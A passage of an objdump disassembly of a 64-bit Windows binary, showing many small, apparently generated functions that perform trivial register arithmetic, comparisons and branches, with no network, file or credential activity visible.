   140001bb4:	41 5d                	pop    %r13
   140001bb6:	41 5c                	pop    %r12
   140001bb8:	5f                   	pop    %rdi
   140001bb9:	5e                   	pop    %rsi
   140001bba:	5b                   	pop    %rbx
   140001bbb:	c3                   	ret
   140001bbc:	53                   	push   %rbx
   140001bbd:	56                   	push   %rsi
   140001bbe:	57                   	push   %rdi
   140001bbf:	41 54                	push   %r12
   140001bc1:	41 55                	push   %r13
   140001bc3:	48 83 ec 20          	sub    $0x20,%rsp
   140001bc7:	e8 8e f4 ff ff       	call   0x14000105a
   140001bcc:	25 ff 00 00 00       	and    $0xff,%eax
   140001bd1:	48 c7 c0 02 00 00 00 	mov    $0x2,%rax
   140001bd8:	48 8d 58 01          	lea    0x1(%rax),%rbx
   140001bdc:	48 01 d8             	add    %rbx,%rax
   140001bdf:	48 83 c4 20          	add    $0x20,%rsp
   140001be3:	41 5d                	pop    %r13
   140001be5:	41 5c                	pop    %r12
   140001be7:	5f                   	pop    %rdi
   140001be8:	5e                   	pop    %rsi
   140001be9:	5b                   	pop    %rbx
   140001bea:	c3                   	ret
   140001beb:	53                   	push   %rbx
   140001bec:	56                   	push   %rsi
   140001bed:	57                   	push   %rdi
   140001bee:	41 54                	push   %r12
   140001bf0:	41 55                	push   %r13
   140001bf2:	48 83 ec 20          	sub    $0x20,%rsp
   140001bf6:	b8 4d 00 00 00       	mov    $0x4d,%eax
   140001bfb:	83 c0 10             	add    $0x10,%eax
   140001bfe:	71 07                	jno    0x140001c07
   140001c00:	b8 00 00 00 00       	mov    $0x0,%eax
   140001c05:	eb 03                	jmp    0x140001c0a
   140001c07:	83 e8 02             	sub    $0x2,%eax
   140001c0a:	48 83 c4 20          	add    $0x20,%rsp
   140001c0e:	41 5d                	pop    %r13
   140001c10:	41 5c                	pop    %r12
   140001c12:	5f                   	pop    %rdi
   140001c13:	5e                   	pop    %rsi
   140001c14:	5b                   	pop    %rbx
   140001c15:	c3                   	ret
   140001c16:	53                   	push   %rbx
   140001c17:	56                   	push   %rsi
   140001c18:	57                   	push   %rdi
   140001c19:	41 54                	push   %r12
   140001c1b:	41 55                	push   %r13
   140001c1d:	48 83 ec 20          	sub    $0x20,%rsp
   140001c21:	b8 97 00 00 00       	mov    $0x97,%eax
   140001c26:	c1 c0 02             	rol    $0x2,%eax
   140001c29:	83 e0 0f             	and    $0xf,%eax
   140001c2c:	48 83 c4 20          	add    $0x20,%rsp
   140001c30:	41 5d                	pop    %r13
   140001c32:	41 5c                	pop    %r12
   140001c34:	5f                   	pop    %rdi
   140001c35:	5e                   	pop    %rsi
   140001c36:	5b                   	pop    %rbx
   140001c37:	c3                   	ret
   140001c38:	53                   	push   %rbx
   140001c39:	56                   	push   %rsi
   140001c3a:	57                   	push   %rdi
   140001c3b:	41 54                	push   %r12
   140001c3d:	41 55                	push   %r13
   140001c3f:	48 83 ec 20          	sub    $0x20,%rsp
   140001c43:	b8 52 00 00 00       	mov    $0x52,%eax
   140001c48:	bb 33 00 00 00       	mov    $0x33,%ebx
   140001c4d:	21 d8                	and    %ebx,%eax
   140001c4f:	09 c3                	or     %eax,%ebx
   140001c51:	f7 d0                	not    %eax
   140001c53:	01 d8                	add    %ebx,%eax
   140001c55:	48 83 c4 20          	add    $0x20,%rsp
   140001c59:	41 5d                	pop    %r13
   140001c5b:	41 5c                	pop    %r12
   140001c5d:	5f                   	pop    %rdi
   140001c5e:	5e                   	pop    %rsi
   140001c5f:	5b                   	pop    %rbx
   140001c60:	c3                   	ret
   140001c61:	53                   	push   %rbx
   140001c62:	56                   	push   %rsi
   140001c63:	57                   	push   %rdi
   140001c64:	41 54                	push   %r12
   140001c66:	41 55                	push   %r13
   140001c68:	48 83 ec 20          	sub    $0x20,%rsp
   140001c6c:	b8 1e 00 00 00       	mov    $0x1e,%eax
   140001c71:	83 f8 1e             	cmp    $0x1e,%eax
   140001c74:	7e 0a                	jle    0x140001c80
   140001c76:	83 f8 46             	cmp    $0x46,%eax
   140001c79:	7d 0a                	jge    0x140001c85
   140001c7b:	6b c0 02             	imul   $0x2,%eax,%eax
   140001c7e:	eb 08                	jmp    0x140001c88
   140001c80:	83 c0 0f             	add    $0xf,%eax
   140001c83:	eb 03                	jmp    0x140001c88
   140001c85:	83 e8 0a             	sub    $0xa,%eax
   140001c88:	48 83 c4 20          	add    $0x20,%rsp
   140001c8c:	41 5d                	pop    %r13
   140001c8e:	41 5c                	pop    %r12
   140001c90:	5f                   	pop    %rdi
   140001c91:	5e                   	pop    %rsi
   140001c92:	5b                   	pop    %rbx
   140001c93:	c3                   	ret
   140001c94:	53                   	push   %rbx
   140001c95:	56                   	push   %rsi
   140001c96:	57                   	push   %rdi
   140001c97:	41 54                	push   %r12
   140001c99:	41 55                	push   %r13
   140001c9b:	48 83 ec 20          	sub    $0x20,%rsp
   140001c9f:	e8 b6 f3 ff ff       	call   0x14000105a
   140001ca4:	25 ff 00 00 00       	and    $0xff,%eax
   140001ca9:	b8 12 00 00 00       	mov    $0x12,%eax
   140001cae:	c1 e0 02             	shl    $0x2,%eax
   140001cb1:	d1 e8                	shr    $1,%eax
   140001cb3:	83 e0 0f             	and    $0xf,%eax
   140001cb6:	48 83 c4 20          	add    $0x20,%rsp
   140001cba:	41 5d                	pop    %r13
   140001cbc:	41 5c                	pop    %r12
   140001cbe:	5f                   	pop    %rdi
   140001cbf:	5e                   	pop    %rsi
   140001cc0:	5b                   	pop    %rbx
   140001cc1:	c3                   	ret
   140001cc2:	53                   	push   %rbx
   140001cc3:	56                   	push   %rsi
   140001cc4:	57                   	push   %rdi
   140001cc5:	41 54                	push   %r12
   140001cc7:	41 55                	push   %r13
   140001cc9:	48 83 ec 20          	sub    $0x20,%rsp
   140001ccd:	e8 88 f3 ff ff       	call   0x14000105a
   140001cd2:	25 ff 00 00 00       	and    $0xff,%eax
   140001cd7:	b8 42 00 00 00       	mov    $0x42,%eax
   140001cdc:	bb 19 00 00 00       	mov    $0x19,%ebx
   140001ce1:	83 f8 1e             	cmp    $0x1e,%eax
   140001ce4:	7c 09                	jl     0x140001cef
   140001ce6:	83 fb 46             	cmp    $0x46,%ebx
   140001ce9:	7f 09                	jg     0x140001cf4
   140001ceb:	01 d8                	add    %ebx,%eax
   140001ced:	eb 08                	jmp    0x140001cf7
   140001cef:	83 e8 05             	sub    $0x5,%eax
   140001cf2:	eb 03                	jmp    0x140001cf7
   140001cf4:	83 c3 0a             	add    $0xa,%ebx
   140001cf7:	48 83 c4 20          	add    $0x20,%rsp
   140001cfb:	41 5d                	pop    %r13
   140001cfd:	41 5c                	pop    %r12
   140001cff:	5f                   	pop    %rdi
   140001d00:	5e                   	pop    %rsi
   140001d01:	5b                   	pop    %rbx
   140001d02:	c3                   	ret
   140001d03:	53                   	push   %rbx
   140001d04:	56                   	push   %rsi
   140001d05:	57                   	push   %rdi
   140001d06:	41 54                	push   %r12
   140001d08:	41 55                	push   %r13
   140001d0a:	48 83 ec 20          	sub    $0x20,%rsp
   140001d0e:	e8 47 f3 ff ff       	call   0x14000105a
   140001d13:	25 ff 00 00 00       	and    $0xff,%eax
   140001d18:	b8 11 01 00 00       	mov    $0x111,%eax
   140001d1d:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001d22:	31 d2                	xor    %edx,%edx
   140001d24:	f7 f1                	div    %ecx
   140001d26:	48 83 c4 20          	add    $0x20,%rsp
   140001d2a:	41 5d                	pop    %r13
   140001d2c:	41 5c                	pop    %r12
   140001d2e:	5f                   	pop    %rdi
   140001d2f:	5e                   	pop    %rsi
   140001d30:	5b                   	pop    %rbx
   140001d31:	c3                   	ret
   140001d32:	53                   	push   %rbx
   140001d33:	56                   	push   %rsi
   140001d34:	57                   	push   %rdi
   140001d35:	41 54                	push   %r12
   140001d37:	41 55                	push   %r13
   140001d39:	48 83 ec 20          	sub    $0x20,%rsp
   140001d3d:	6a 15                	push   $0x15
   140001d3f:	6a 07                	push   $0x7
   140001d41:	58                   	pop    %rax
   140001d42:	5b                   	pop    %rbx
   140001d43:	48 0f af c3          	imul   %rbx,%rax
   140001d47:	48 83 c4 20          	add    $0x20,%rsp
   140001d4b:	41 5d                	pop    %r13
   140001d4d:	41 5c                	pop    %r12
   140001d4f:	5f                   	pop    %rdi
   140001d50:	5e                   	pop    %rsi
   140001d51:	5b                   	pop    %rbx
   140001d52:	c3                   	ret
   140001d53:	53                   	push   %rbx
   140001d54:	56                   	push   %rsi
   140001d55:	57                   	push   %rdi
   140001d56:	41 54                	push   %r12
   140001d58:	41 55                	push   %r13
   140001d5a:	48 83 ec 20          	sub    $0x20,%rsp
   140001d5e:	e8 f7 f2 ff ff       	call   0x14000105a
   140001d63:	25 ff 00 00 00       	and    $0xff,%eax
   140001d68:	b8 1f 00 00 00       	mov    $0x1f,%eax
   140001d6d:	83 f8 32             	cmp    $0x32,%eax
   140001d70:	7f 05                	jg     0x140001d77
   140001d72:	6b c0 02             	imul   $0x2,%eax,%eax
   140001d75:	eb 03                	jmp    0x140001d7a
   140001d77:	6b c0 03             	imul   $0x3,%eax,%eax
   140001d7a:	48 83 c4 20          	add    $0x20,%rsp
   140001d7e:	41 5d                	pop    %r13
   140001d80:	41 5c                	pop    %r12
   140001d82:	5f                   	pop    %rdi
   140001d83:	5e                   	pop    %rsi
   140001d84:	5b                   	pop    %rbx
   140001d85:	c3                   	ret
   140001d86:	53                   	push   %rbx
   140001d87:	56                   	push   %rsi
   140001d88:	57                   	push   %rdi
   140001d89:	41 54                	push   %r12
   140001d8b:	41 55                	push   %r13
   140001d8d:	48 83 ec 20          	sub    $0x20,%rsp
   140001d91:	b8 30 00 00 00       	mov    $0x30,%eax
   140001d96:	bb 05 00 00 00       	mov    $0x5,%ebx
   140001d9b:	39 d8                	cmp    %ebx,%eax
   140001d9d:	7f 04                	jg     0x140001da3
   140001d9f:	89 c1                	mov    %eax,%ecx
   140001da1:	eb 02                	jmp    0x140001da5
   140001da3:	89 d9                	mov    %ebx,%ecx
   140001da5:	01 c8                	add    %ecx,%eax
   140001da7:	48 83 c4 20          	add    $0x20,%rsp
   140001dab:	41 5d                	pop    %r13
   140001dad:	41 5c                	pop    %r12
   140001daf:	5f                   	pop    %rdi
   140001db0:	5e                   	pop    %rsi
   140001db1:	5b                   	pop    %rbx
   140001db2:	c3                   	ret
   140001db3:	53                   	push   %rbx
   140001db4:	56                   	push   %rsi
   140001db5:	57                   	push   %rdi
   140001db6:	41 54                	push   %r12
   140001db8:	41 55                	push   %r13
   140001dba:	48 83 ec 20          	sub    $0x20,%rsp
   140001dbe:	b8 c4 00 00 00       	mov    $0xc4,%eax
   140001dc3:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001dc8:	31 d2                	xor    %edx,%edx
   140001dca:	f7 f1                	div    %ecx
   140001dcc:	48 83 c4 20          	add    $0x20,%rsp
   140001dd0:	41 5d                	pop    %r13
   140001dd2:	41 5c                	pop    %r12
   140001dd4:	5f                   	pop    %rdi
   140001dd5:	5e                   	pop    %rsi
   140001dd6:	5b                   	pop    %rbx
   140001dd7:	c3                   	ret
   140001dd8:	53                   	push   %rbx
   140001dd9:	56                   	push   %rsi
   140001dda:	57                   	push   %rdi
   140001ddb:	41 54                	push   %r12
   140001ddd:	41 55                	push   %r13
   140001ddf:	48 83 ec 20          	sub    $0x20,%rsp
   140001de3:	b8 01 00 00 00       	mov    $0x1,%eax
   140001de8:	bb 21 00 00 00       	mov    $0x21,%ebx
   140001ded:	01 d8                	add    %ebx,%eax
   140001def:	d1 e0                	shl    $1,%eax
   140001df1:	48 83 c4 20          	add    $0x20,%rsp
   140001df5:	41 5d                	pop    %r13
   140001df7:	41 5c                	pop    %r12
   140001df9:	5f                   	pop    %rdi
   140001dfa:	5e                   	pop    %rsi
   140001dfb:	5b                   	pop    %rbx
   140001dfc:	c3                   	ret
   140001dfd:	53                   	push   %rbx
   140001dfe:	56                   	push   %rsi
   140001dff:	57                   	push   %rdi
   140001e00:	41 54                	push   %r12
   140001e02:	41 55                	push   %r13
   140001e04:	48 83 ec 20          	sub    $0x20,%rsp
   140001e08:	b8 14 00 00 00       	mov    $0x14,%eax
   140001e0d:	83 f8 1e             	cmp    $0x1e,%eax
   140001e10:	7e 0a                	jle    0x140001e1c
   140001e12:	83 f8 46             	cmp    $0x46,%eax
   140001e15:	7d 0a                	jge    0x140001e21
   140001e17:	6b c0 02             	imul   $0x2,%eax,%eax
   140001e1a:	eb 08                	jmp    0x140001e24
   140001e1c:	83 c0 0f             	add    $0xf,%eax
   140001e1f:	eb 03                	jmp    0x140001e24
   140001e21:	83 e8 0a             	sub    $0xa,%eax
   140001e24:	48 83 c4 20          	add    $0x20,%rsp
   140001e28:	41 5d                	pop    %r13
   140001e2a:	41 5c                	pop    %r12
   140001e2c:	5f                   	pop    %rdi
   140001e2d:	5e                   	pop    %rsi
   140001e2e:	5b                   	pop    %rbx
   140001e2f:	c3                   	ret
   140001e30:	53                   	push   %rbx
   140001e31:	56                   	push   %rsi
   140001e32:	57                   	push   %rdi
   140001e33:	41 54                	push   %r12
   140001e35:	41 55                	push   %r13
   140001e37:	48 83 ec 20          	sub    $0x20,%rsp
   140001e3b:	b8 39 00 00 00       	mov    $0x39,%eax
   140001e40:	bb 07 00 00 00       	mov    $0x7,%ebx
   140001e45:	b9 0d 00 00 00       	mov    $0xd,%ecx
   140001e4a:	01 d8                	add    %ebx,%eax
   140001e4c:	29 c1                	sub    %eax,%ecx
   140001e4e:	48 83 c4 20          	add    $0x20,%rsp
   140001e52:	41 5d                	pop    %r13
   140001e54:	41 5c                	pop    %r12
   140001e56:	5f                   	pop    %rdi
   140001e57:	5e                   	pop    %rsi
   140001e58:	5b                   	pop    %rbx
   140001e59:	c3                   	ret
   140001e5a:	53                   	push   %rbx
   140001e5b:	56                   	push   %rsi
   140001e5c:	57                   	push   %rdi
   140001e5d:	41 54                	push   %r12
   140001e5f:	41 55                	push   %r13
   140001e61:	48 83 ec 20          	sub    $0x20,%rsp
   140001e65:	b8 31 00 00 00       	mov    $0x31,%eax
   140001e6a:	6b c0 14             	imul   $0x14,%eax,%eax
   140001e6d:	83 c0 0d             	add    $0xd,%eax
   140001e70:	83 e8 06             	sub    $0x6,%eax
   140001e73:	f7 d8                	neg    %eax
   140001e75:	48 83 c4 20          	add    $0x20,%rsp
   140001e79:	41 5d                	pop    %r13
   140001e7b:	41 5c                	pop    %r12
   140001e7d:	5f                   	pop    %rdi
   140001e7e:	5e                   	pop    %rsi
   140001e7f:	5b                   	pop    %rbx
   140001e80:	c3                   	ret
   140001e81:	53                   	push   %rbx
   140001e82:	56                   	push   %rsi
   140001e83:	57                   	push   %rdi
   140001e84:	41 54                	push   %r12
   140001e86:	41 55                	push   %r13
   140001e88:	48 83 ec 20          	sub    $0x20,%rsp
   140001e8c:	b8 01 00 00 00       	mov    $0x1,%eax
   140001e91:	b9 03 00 00 00       	mov    $0x3,%ecx
   140001e96:	6b c0 02             	imul   $0x2,%eax,%eax
   140001e99:	ff c9                	dec    %ecx
   140001e9b:	75 f9                	jne    0x140001e96
   140001e9d:	48 83 c4 20          	add    $0x20,%rsp
   140001ea1:	41 5d                	pop    %r13
   140001ea3:	41 5c                	pop    %r12
   140001ea5:	5f                   	pop    %rdi
   140001ea6:	5e                   	pop    %rsi
   140001ea7:	5b                   	pop    %rbx
   140001ea8:	c3                   	ret
   140001ea9:	53                   	push   %rbx
   140001eaa:	56                   	push   %rsi
   140001eab:	57                   	push   %rdi
   140001eac:	41 54                	push   %r12
   140001eae:	41 55                	push   %r13
   140001eb0:	48 83 ec 20          	sub    $0x20,%rsp
   140001eb4:	b8 3b 00 00 00       	mov    $0x3b,%eax
   140001eb9:	83 f8 1e             	cmp    $0x1e,%eax
   140001ebc:	7e 0a                	jle    0x140001ec8
   140001ebe:	83 f8 46             	cmp    $0x46,%eax
   140001ec1:	7d 0a                	jge    0x140001ecd
   140001ec3:	6b c0 02             	imul   $0x2,%eax,%eax
   140001ec6:	eb 08                	jmp    0x140001ed0
   140001ec8:	83 c0 0f             	add    $0xf,%eax
   140001ecb:	eb 03                	jmp    0x140001ed0
   140001ecd:	83 e8 0a             	sub    $0xa,%eax
   140001ed0:	48 83 c4 20          	add    $0x20,%rsp
   140001ed4:	41 5d                	pop    %r13
   140001ed6:	41 5c                	pop    %r12
   140001ed8:	5f                   	pop    %rdi
   140001ed9:	5e                   	pop    %rsi
   140001eda:	5b                   	pop    %rbx
   140001edb:	c3                   	ret
   140001edc:	53                   	push   %rbx
   140001edd:	56                   	push   %rsi
   140001ede:	57                   	push   %rdi
   140001edf:	41 54                	push   %r12
   140001ee1:	41 55                	push   %r13
   140001ee3:	48 83 ec 20          	sub    $0x20,%rsp
   140001ee7:	b8 01 00 00 00       	mov    $0x1,%eax
   140001eec:	b9 03 00 00 00       	mov    $0x3,%ecx
   140001ef1:	6b c0 02             	imul   $0x2,%eax,%eax
   140001ef4:	ff c9                	dec    %ecx
   140001ef6:	75 f9                	jne    0x140001ef1
   140001ef8:	48 83 c4 20          	add    $0x20,%rsp
   140001efc:	41 5d                	pop    %r13
   140001efe:	41 5c                	pop    %r12
   140001f00:	5f                   	pop    %rdi
   140001f01:	5e                   	pop    %rsi
   140001f02:	5b                   	pop    %rbx
   140001f03:	c3                   	ret
   140001f04:	53                   	push   %rbx
   140001f05:	56                   	push   %rsi
   140001f06:	57                   	push   %rdi
   140001f07:	41 54                	push   %r12
   140001f09:	41 55                	push   %r13
   140001f0b:	48 83 ec 20          	sub    $0x20,%rsp
   140001f0f:	b8 1c 00 00 00       	mov    $0x1c,%eax
   140001f14:	d1 e0                	shl    $1,%eax
   140001f16:	d1 e8                	shr    $1,%eax
   140001f18:	83 e0 0f             	and    $0xf,%eax
   140001f1b:	48 83 c4 20          	add    $0x20,%rsp
   140001f1f:	41 5d                	pop    %r13
   140001f21:	41 5c                	pop    %r12
   140001f23:	5f                   	pop    %rdi
   140001f24:	5e                   	pop    %rsi
   140001f25:	5b                   	pop    %rbx
   140001f26:	c3                   	ret
   140001f27:	53                   	push   %rbx
   140001f28:	56                   	push   %rsi
   140001f29:	57                   	push   %rdi
   140001f2a:	41 54                	push   %r12
   140001f2c:	41 55                	push   %r13
   140001f2e:	48 83 ec 20          	sub    $0x20,%rsp
   140001f32:	e8 23 f1 ff ff       	call   0x14000105a
   140001f37:	25 ff 00 00 00       	and    $0xff,%eax
   140001f3c:	b8 2d 00 00 00       	mov    $0x2d,%eax
   140001f41:	bb 22 00 00 00       	mov    $0x22,%ebx
   140001f46:	b9 03 00 00 00       	mov    $0x3,%ecx
   140001f4b:	01 d8                	add    %ebx,%eax
   140001f4d:	29 c1                	sub    %eax,%ecx
   140001f4f:	48 83 c4 20          	add    $0x20,%rsp
   140001f53:	41 5d                	pop    %r13
   140001f55:	41 5c                	pop    %r12
   140001f57:	5f                   	pop    %rdi
   140001f58:	5e                   	pop    %rsi
   140001f59:	5b                   	pop    %rbx
   140001f5a:	c3                   	ret
   140001f5b:	53                   	push   %rbx
   140001f5c:	56                   	push   %rsi
   140001f5d:	57                   	push   %rdi
   140001f5e:	41 54                	push   %r12
   140001f60:	41 55                	push   %r13
   140001f62:	48 83 ec 20          	sub    $0x20,%rsp
   140001f66:	e8 ef f0 ff ff       	call   0x14000105a
   140001f6b:	25 ff 00 00 00       	and    $0xff,%eax
   140001f70:	6a 09                	push   $0x9
   140001f72:	58                   	pop    %rax
   140001f73:	50                   	push   %rax
   140001f74:	5b                   	pop    %rbx
   140001f75:	48 83 c4 20          	add    $0x20,%rsp
   140001f79:	41 5d                	pop    %r13
   140001f7b:	41 5c                	pop    %r12
   140001f7d:	5f                   	pop    %rdi
   140001f7e:	5e                   	pop    %rsi
   140001f7f:	5b                   	pop    %rbx
   140001f80:	c3                   	ret
   140001f81:	53                   	push   %rbx
   140001f82:	56                   	push   %rsi
   140001f83:	57                   	push   %rdi
   140001f84:	41 54                	push   %r12
   140001f86:	41 55                	push   %r13
   140001f88:	48 83 ec 20          	sub    $0x20,%rsp
   140001f8c:	b8 18 00 00 00       	mov    $0x18,%eax
   140001f91:	6b c0 02             	imul   $0x2,%eax,%eax
   140001f94:	83 c0 10             	add    $0x10,%eax
   140001f97:	6b c0 03             	imul   $0x3,%eax,%eax
   140001f9a:	48 83 c4 20          	add    $0x20,%rsp
   140001f9e:	41 5d                	pop    %r13
   140001fa0:	41 5c                	pop    %r12
   140001fa2:	5f                   	pop    %rdi
   140001fa3:	5e                   	pop    %rsi
   140001fa4:	5b                   	pop    %rbx
   140001fa5:	c3                   	ret
   140001fa6:	53                   	push   %rbx
   140001fa7:	56                   	push   %rsi
   140001fa8:	57                   	push   %rdi
   140001fa9:	41 54                	push   %r12
   140001fab:	41 55                	push   %r13
   140001fad:	48 83 ec 20          	sub    $0x20,%rsp
   140001fb1:	48 c7 c0 21 00 00 00 	mov    $0x21,%rax
   140001fb8:	50                   	push   %rax
   140001fb9:	5b                   	pop    %rbx
   140001fba:	48 83 c3 05          	add    $0x5,%rbx
   140001fbe:	48 83 c4 20          	add    $0x20,%rsp
   140001fc2:	41 5d                	pop    %r13
   140001fc4:	41 5c                	pop    %r12
   140001fc6:	5f                   	pop    %rdi
   140001fc7:	5e                   	pop    %rsi
   140001fc8:	5b                   	pop    %rbx
   140001fc9:	c3                   	ret
   140001fca:	53                   	push   %rbx
   140001fcb:	56                   	push   %rsi
   140001fcc:	57                   	push   %rdi
   140001fcd:	41 54                	push   %r12
   140001fcf:	41 55                	push   %r13
   140001fd1:	48 83 ec 20          	sub    $0x20,%rsp
   140001fd5:	b8 60 00 00 00       	mov    $0x60,%eax
   140001fda:	bb 0f 00 00 00       	mov    $0xf,%ebx
   140001fdf:	39 d8                	cmp    %ebx,%eax
   140001fe1:	7f 04                	jg     0x140001fe7
   140001fe3:	89 c1                	mov    %eax,%ecx
   140001fe5:	eb 02                	jmp    0x140001fe9
   140001fe7:	89 d9                	mov    %ebx,%ecx
   140001fe9:	01 c8                	add    %ecx,%eax
   140001feb:	48 83 c4 20          	add    $0x20,%rsp
   140001fef:	41 5d                	pop    %r13
   140001ff1:	41 5c                	pop    %r12
   140001ff3:	5f                   	pop    %rdi
   140001ff4:	5e                   	pop    %rsi
   140001ff5:	5b                   	pop    %rbx
   140001ff6:	c3                   	ret
   140001ff7:	53                   	push   %rbx
   140001ff8:	56                   	push   %rsi
   140001ff9:	57                   	push   %rdi
   140001ffa:	41 54                	push   %r12
   140001ffc:	41 55                	push   %r13
   140001ffe:	48 83 ec 20          	sub    $0x20,%rsp
   140002002:	b8 57 00 00 00       	mov    $0x57,%eax
   140002007:	bb 25 00 00 00       	mov    $0x25,%ebx
   14000200c:	01 d8                	add    %ebx,%eax
   14000200e:	d1 e0                	shl    $1,%eax
   140002010:	48 83 c4 20          	add    $0x20,%rsp
   140002014:	41 5d                	pop    %r13
   140002016:	41 5c                	pop    %r12
   140002018:	5f                   	pop    %rdi
   140002019:	5e                   	pop    %rsi
   14000201a:	5b                   	pop    %rbx
   14000201b:	c3                   	ret
   14000201c:	53                   	push   %rbx
   14000201d:	56                   	push   %rsi
   14000201e:	57                   	push   %rdi
   14000201f:	41 54                	push   %r12
   140002021:	41 55                	push   %r13
   140002023:	48 83 ec 20          	sub    $0x20,%rsp
   140002027:	b8 b0 00 00 00       	mov    $0xb0,%eax
   14000202c:	c1 c0 02             	rol    $0x2,%eax
   14000202f:	83 e0 0f             	and    $0xf,%eax
   140002032:	48 83 c4 20          	add    $0x20,%rsp
   140002036:	41 5d                	pop    %r13
   140002038:	41 5c                	pop    %r12
   14000203a:	5f                   	pop    %rdi
   14000203b:	5e                   	pop    %rsi
   14000203c:	5b                   	pop    %rbx
   14000203d:	c3                   	ret
   14000203e:	53                   	push   %rbx
   14000203f:	56                   	push   %rsi
   140002040:	57                   	push   %rdi
   140002041:	41 54                	push   %r12
   140002043:	41 55                	push   %r13
   140002045:	48 83 ec 20          	sub    $0x20,%rsp
   140002049:	6a 2d                	push   $0x2d
   14000204b:	58                   	pop    %rax
   14000204c:	48 d1 e0             	shl    $1,%rax
   14000204f:	48 83 c4 20          	add    $0x20,%rsp
   140002053:	41 5d                	pop    %r13
   140002055:	41 5c                	pop    %r12
   140002057:	5f                   	pop    %rdi
   140002058:	5e                   	pop    %rsi
   140002059:	5b                   	pop    %rbx
   14000205a:	c3                   	ret
   14000205b:	53                   	push   %rbx
   14000205c:	56                   	push   %rsi
   14000205d:	57                   	push   %rdi
   14000205e:	41 54                	push   %r12
   140002060:	41 55                	push   %r13
   140002062:	48 83 ec 20          	sub    $0x20,%rsp
   140002066:	b8 1b 00 00 00       	mov    $0x1b,%eax
   14000206b:	83 f8 32             	cmp    $0x32,%eax
   14000206e:	7f 05                	jg     0x140002075
   140002070:	6b c0 02             	imul   $0x2,%eax,%eax
   140002073:	eb 03                	jmp    0x140002078
   140002075:	6b c0 03             	imul   $0x3,%eax,%eax
   140002078:	48 83 c4 20          	add    $0x20,%rsp
   14000207c:	41 5d                	pop    %r13
   14000207e:	41 5c                	pop    %r12
   140002080:	5f                   	pop    %rdi
   140002081:	5e                   	pop    %rsi
   140002082:	5b                   	pop    %rbx
   140002083:	c3                   	ret
   140002084:	53                   	push   %rbx
   140002085:	56                   	push   %rsi
   140002086:	57                   	push   %rdi
   140002087:	41 54                	push   %r12
   140002089:	41 55                	push   %r13
   14000208b:	48 83 ec 20          	sub    $0x20,%rsp
   14000208f:	e8 c6 ef ff ff       	call   0x14000105a
   140002094:	25 ff 00 00 00       	and    $0xff,%eax
   140002099:	b8 01 00 00 00       	mov    $0x1,%eax
   14000209e:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400020a3:	0f af c1             	imul   %ecx,%eax
   1400020a6:	ff c9                	dec    %ecx
   1400020a8:	75 f9                	jne    0x1400020a3
   1400020aa:	48 83 c4 20          	add    $0x20,%rsp
   1400020ae:	41 5d                	pop    %r13
   1400020b0:	41 5c                	pop    %r12
   1400020b2:	5f                   	pop    %rdi
   1400020b3:	5e                   	pop    %rsi
   1400020b4:	5b                   	pop    %rbx
   1400020b5:	c3                   	ret
   1400020b6:	53                   	push   %rbx
   1400020b7:	56                   	push   %rsi
   1400020b8:	57                   	push   %rdi
   1400020b9:	41 54                	push   %r12
   1400020bb:	41 55                	push   %r13
   1400020bd:	48 83 ec 20          	sub    $0x20,%rsp
   1400020c1:	b8 b5 00 00 00       	mov    $0xb5,%eax
   1400020c6:	83 e0 04             	and    $0x4,%eax
   1400020c9:	74 03                	je     0x1400020ce
   1400020cb:	83 c0 0a             	add    $0xa,%eax
   1400020ce:	48 83 c4 20          	add    $0x20,%rsp
   1400020d2:	41 5d                	pop    %r13
   1400020d4:	41 5c                	pop    %r12
   1400020d6:	5f                   	pop    %rdi
   1400020d7:	5e                   	pop    %rsi
   1400020d8:	5b                   	pop    %rbx
   1400020d9:	c3                   	ret
   1400020da:	53                   	push   %rbx
   1400020db:	56                   	push   %rsi
   1400020dc:	57                   	push   %rdi
   1400020dd:	41 54                	push   %r12
   1400020df:	41 55                	push   %r13
   1400020e1:	48 83 ec 20          	sub    $0x20,%rsp
   1400020e5:	e8 70 ef ff ff       	call   0x14000105a
   1400020ea:	25 ff 00 00 00       	and    $0xff,%eax
   1400020ef:	b8 1c 00 00 00       	mov    $0x1c,%eax
   1400020f4:	bb 30 00 00 00       	mov    $0x30,%ebx
   1400020f9:	b9 47 00 00 00       	mov    $0x47,%ecx
   1400020fe:	01 d8                	add    %ebx,%eax
   140002100:	01 c8                	add    %ecx,%eax
   140002102:	48 83 c4 20          	add    $0x20,%rsp
   140002106:	41 5d                	pop    %r13
   140002108:	41 5c                	pop    %r12
   14000210a:	5f                   	pop    %rdi
   14000210b:	5e                   	pop    %rsi
   14000210c:	5b                   	pop    %rbx
   14000210d:	c3                   	ret
   14000210e:	53                   	push   %rbx
   14000210f:	56                   	push   %rsi
   140002110:	57                   	push   %rdi
   140002111:	41 54                	push   %r12
   140002113:	41 55                	push   %r13
   140002115:	48 83 ec 20          	sub    $0x20,%rsp
   140002119:	b8 05 00 00 00       	mov    $0x5,%eax
   14000211e:	d1 e0                	shl    $1,%eax
   140002120:	72 02                	jb     0x140002124
   140002122:	d1 e8                	shr    $1,%eax
   140002124:	48 83 c4 20          	add    $0x20,%rsp
   140002128:	41 5d                	pop    %r13
   14000212a:	41 5c                	pop    %r12
   14000212c:	5f                   	pop    %rdi
   14000212d:	5e                   	pop    %rsi
   14000212e:	5b                   	pop    %rbx
   14000212f:	c3                   	ret
   140002130:	53                   	push   %rbx
   140002131:	56                   	push   %rsi
   140002132:	57                   	push   %rdi
   140002133:	41 54                	push   %r12
   140002135:	41 55                	push   %r13
   140002137:	48 83 ec 20          	sub    $0x20,%rsp
   14000213b:	b8 5e 00 00 00       	mov    $0x5e,%eax
   140002140:	6b c0 02             	imul   $0x2,%eax,%eax
   140002143:	83 c0 1e             	add    $0x1e,%eax
   140002146:	6b c0 03             	imul   $0x3,%eax,%eax
   140002149:	48 83 c4 20          	add    $0x20,%rsp
   14000214d:	41 5d                	pop    %r13
   14000214f:	41 5c                	pop    %r12
   140002151:	5f                   	pop    %rdi
   140002152:	5e                   	pop    %rsi
   140002153:	5b                   	pop    %rbx
   140002154:	c3                   	ret
   140002155:	53                   	push   %rbx
   140002156:	56                   	push   %rsi
   140002157:	57                   	push   %rdi
   140002158:	41 54                	push   %r12
   14000215a:	41 55                	push   %r13
   14000215c:	48 83 ec 20          	sub    $0x20,%rsp
   140002160:	e8 f5 ee ff ff       	call   0x14000105a
   140002165:	25 ff 00 00 00       	and    $0xff,%eax
   14000216a:	6a 23                	push   $0x23
   14000216c:	6a 0d                	push   $0xd
   14000216e:	58                   	pop    %rax
